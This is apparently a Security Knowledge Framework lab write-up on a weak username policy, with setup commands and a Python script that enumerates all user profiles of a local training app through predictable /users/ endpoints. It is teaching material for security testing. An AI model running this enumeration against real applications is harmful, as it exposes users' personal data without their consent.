# KBID xxx - Weak or Unenforced Username Policy

## Running the app

```
$ sudo docker pull blabla1337/weak-or-unenforced-username-policy
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/weak-or-unenforced-username-policy
```

{% hint style="success" %}

{% endhint %}

Now that the app is running let's go hacking!

## Running the app Python3

First, make sure python3 and pip are installed on your host machine. After installation, we go to the folder of the lab we want to practise "i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:

```
$ pip3 install -r requirements.txt
```

```
$ python3 <labname>
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

![Docker image and write-up thanks to Contrast Security](../../.gitbook/assets/contrast-security-logo.jpg)

## Reconnaissance

To test for this vulnerability, we need to enumerate the users of the application and see if we can find any interesting information about them.

After we create a user and login we can go the user profile page and see that our current user information is displayed.

If we open the developer tools and go to the network tab we can see that the user information is loaded from the `/users/<username>-<number>` endpoint.

In this case we created a user with the name `John` and a last name `Doe`. The endpoint of our user is `/users/jdoe-1`.

If we try the endpoint `/users/jdoe-0` we get the information of a different user. This means that the user id is incremented by one for each user. This is a good sign that we can enumerate the users.

There is also a `/users/` endpoint that returns a list of all users. This endpoint is not used in the application but it is still interesting to see what information is returned.

## Exploitation

To enumerate the users we can use a simple script that will use the `/users/` endpoint to get a list of all users and then use the `/users/<username>-<number>` endpoint to get the information of each user.

Now we need to use `name`, `last_name` and a counter to generate the correct endpoint.

```python
import requests

url = "http://localhost:5000/users/"

r = requests.get(url)
users = r.json()

usernames = []
for user in users:
    name = user["name"]
    last_name = user["lastname"]
    username = name[0].lower() + last_name.lower() + "-"
    temp_l = [user for user in usernames if user.startswith(username)]
    usernames.append(username + str(len(temp_l)))

for username in usernames:
    r = requests.get(url + username)
    print(r.json())
```

## Additional sources

[owasp.org | Testing for Weak or Unenforced Username Policy](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy)
